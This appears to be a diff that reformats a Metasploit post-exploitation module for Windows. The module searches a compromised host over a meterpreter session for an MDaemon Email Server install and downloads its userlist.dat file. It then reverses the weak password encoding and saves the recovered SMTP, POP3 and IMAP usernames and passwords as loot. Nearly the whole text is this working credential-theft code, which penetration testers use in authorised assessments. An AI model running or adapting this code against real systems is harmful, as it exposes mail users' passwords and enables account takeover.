@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -12,41 +13,40 @@ class MetasploitModule < Msf::Post
   Rank = ExcellentRanking
   def initialize(info = {})
     super(update_info(info,
-        'Name'          => 'Windows Gather MDaemonEmailServer Credential Cracking',
-        'Description'   => %q{
-          Finds and cracks the stored passwords of MDaemon Email Server.
-        },
-        'References'     =>
-        [
-          ['BID', '4686']
-        ],
-        'License'       => MSF_LICENSE,
-        'Author'        => ['Manuel Nader #AgoraSecurity'],
-        'Platform'      => ['win'],
-        'Arch'          => [ARCH_X86, ARCH_X64],
-        'SessionTypes'  => ['meterpreter']
-    ))
+                      'Name'          => 'Windows Gather MDaemonEmailServer Credential Cracking',
+                      'Description'   => %q(
+                        Finds and cracks the stored passwords of MDaemon Email Server.
+                      ),
+                      'References' =>
+                      [
+                        ['BID', '4686']
+                      ],
+                      'License'       => MSF_LICENSE,
+                      'Author'        => ['Manuel Nader #AgoraSecurity'],
+                      'Platform'      => ['win'],
+                      'Arch'          => [ARCH_X86, ARCH_X64],
+                      'SessionTypes'  => ['meterpreter']))
 
     register_options(
-      [OptString.new('RPATH', [false, 'Path of the MDaemon installation', false]) # If software is installed on a rare directory
-    ], self.class)
+      [OptString.new('RPATH', [false, 'Path of the MDaemon installation', false])] # If software is installed on a rare directory, self.class
+    )
   end
 
   def run
-      if session.type != 'meterpreter'
-        print_error ('Only meterpreter sessions are supported by this post module')
-        return
+    if session.type != 'meterpreter'
+      print_error 'Only meterpreter sessions are supported by this post module'
+      return
+    end
+    progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
+    locations = []
+    progfiles_env.each do |_k, v|
+      vprint_status("Searching MDaemon installation at #{v}")
+      if session.fs.dir.entries(name = v).include? 'MDaemon'
+        vprint_status("Found MDaemon installation at #{v}")
+        locations << v + '\\MDaemon\\'
       end
-      progfiles_env = session.sys.config.getenvs('SYSTEMDRIVE', 'HOMEDRIVE', 'ProgramFiles', 'ProgramFiles(x86)', 'ProgramW6432')
-      locations = []
-      progfiles_env.each do |_k, v|
-        vprint_status("Searching MDaemon installation at #{v}")
-        if session.fs.dir.entries(name = v).include? 'MDaemon'
-          vprint_status("Found MDaemon installation at #{v}")
-          locations << v + '\\MDaemon\\'
-        end
-        next
-      end
+      next
+    end
 
     keys = [
       'HKLM\\SOFTWARE\\Alt-N Technologies\\MDaemon', # 64 bit. Has AppPath
@@ -55,9 +55,7 @@ class MetasploitModule < Msf::Post
 
     locations = ['C:\MDaemon\App']
 
-    if datastore['RHOST'].nil?
-      locations << datastore['RHOST']
-    end
+    locations << datastore['RHOST'] if datastore['RHOST'].nil?
 
     keys.each do |key|
       begin
@@ -82,14 +80,14 @@ class MetasploitModule < Msf::Post
     crack = decode
     result = ''
     for i in 0..(crack.size - 1)
-      if (crack[i] - offset[i]) > 0
-        result << (crack[i] - offset[i])
-      else
-        result << ((crack[i] - offset[i]) + 128)
-      end
+      result << if (crack[i] - offset[i]) > 0
+                  (crack[i] - offset[i])
+                else
+                  ((crack[i] - offset[i]) + 128)
+                end
     end
     vprint_status("Password #{result}")
-    return result
+    result
   end
 
   def check_mdaemons(locations)
@@ -98,17 +96,16 @@ class MetasploitModule < Msf::Post
       locations.each do |location|
         vprint_status("Checking for Userlist in MDaemons directory at: #{location}")
         begin
-          session.fs.dir.foreach("#{location}") do |fdir|
+          session.fs.dir.foreach(location.to_s) do |fdir|
             ['userlist.dat'].each do |datfile|
-              if fdir.downcase == datfile.downcase
-                filepath = location + '\\' + datfile
-                print_good("Configuration file found: #{filepath}")
-                print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
-                vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
-                session.fs.file.download_file(tmp_filename, filepath)
-                # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
-                return tmp_filename
-              end
+              next unless fdir.casecmp(datfile.downcase).zero?
+              filepath = location + '\\' + datfile
+              print_good("Configuration file found: #{filepath}")
+              print_good("Found MDaemons on #{sysinfo['Computer']} via session ID: #{session.sid}")
+              vprint_status("Downloading UserList.dat file to tmp file: #{tmp_filename}")
+              session.fs.file.download_file(tmp_filename, filepath)
+              # userdat = session.fs.file.open(filepath).read.to_s.split(/\n/)
+              return tmp_filename
             end
           end
         rescue Rex::Post::Meterpreter::RequestError => e
@@ -120,7 +117,7 @@ class MetasploitModule < Msf::Post
       return
     end
 
-    return nil
+    nil
   end
 
   def parse_userlist(data)
@@ -138,7 +135,7 @@ class MetasploitModule < Msf::Post
       mail_dir = line.slice(105..194).strip!
       raw_password = line.slice(195..210)
       password = crack_password(raw_password)
-      access= line.slice(217)
+      access = line.slice(217)
       users     += 1
       passwords += 1
       if access == 'Y' # IMAP & POP3
@@ -160,7 +157,7 @@ class MetasploitModule < Msf::Post
     del_cmd << data
     system(del_cmd)
     result = [creds, imap, pop3]
-    return result
+    result
   end
 
   def report_cred(creds)
@@ -179,11 +176,11 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        module_fullname: self.fullname
+        module_fullname: fullname
       }
       credential_data.merge!(service_data)
       credential_core = create_credential(credential_data)
@@ -198,12 +195,12 @@ class MetasploitModule < Msf::Post
       login_data.merge!(service_data)
       create_credential_login(login_data)
 
-      print_status ("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
+      print_status "    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}"
     end
 
     # report the goods!
     loot_path = store_loot('MDaemon.smtp_server.creds', 'text/csv', session, creds.to_csv,
-      'mdaemon_smtp_server_credentials.csv', 'MDaemon SMTP Users Credentials')
+                           'mdaemon_smtp_server_credentials.csv', 'MDaemon SMTP Users Credentials')
     print_status("SMTP credentials saved in: #{loot_path}")
   end
 
@@ -223,11 +220,11 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        module_fullname: self.fullname
+        module_fullname: fullname
       }
       credential_data.merge!(service_data)
       credential_core = create_credential(credential_data)
@@ -242,12 +239,12 @@ class MetasploitModule < Msf::Post
       login_data.merge!(service_data)
       create_credential_login(login_data)
 
-      print_status ("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
+      print_status "    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}"
     end
 
     # report the goods!
     loot_path = store_loot('MDaemon.pop3_server.creds', 'text/csv', session, creds.to_csv,
-      'mdaemon_pop3_server_credentials.csv', 'MDaemon POP3 Users Credentials')
+                           'mdaemon_pop3_server_credentials.csv', 'MDaemon POP3 Users Credentials')
     print_status("POP3 credentials saved in: #{loot_path}")
   end
 
@@ -267,11 +264,11 @@ class MetasploitModule < Msf::Post
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
-        post_reference_name: self.refname,
+        post_reference_name: refname,
         private_type: :password,
         private_data: cred[4],
         username: cred[1],
-        module_fullname: self.fullname
+        module_fullname: fullname
       }
       credential_data.merge!(service_data)
       credential_core = create_credential(credential_data)
@@ -286,12 +283,12 @@ class MetasploitModule < Msf::Post
       login_data.merge!(service_data)
       create_credential_login(login_data)
 
-      print_status ("    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}")
+      print_status "    Extracted: #{credential_data[:username]}:#{credential_data[:private_data]}"
     end
 
     # report the goods!
     loot_path = store_loot('MDaemon.imap_server.creds', 'text/csv', session, creds.to_csv,
-      'mdaemon_imap_server_credentials.csv', 'MDaemon SMTP Users Credentials')
+                           'mdaemon_imap_server_credentials.csv', 'MDaemon SMTP Users Credentials')
     print_status("IMAP credentials saved in: #{loot_path}")
   end
 
@@ -306,7 +303,8 @@ class MetasploitModule < Msf::Post
         'Full Name',
         'Mail Dir',
         'Password'
-      ])
+      ]
+    )
     result = parse_userlist(userlist)
     report_cred(result[0])
     report_pop3(result[1])
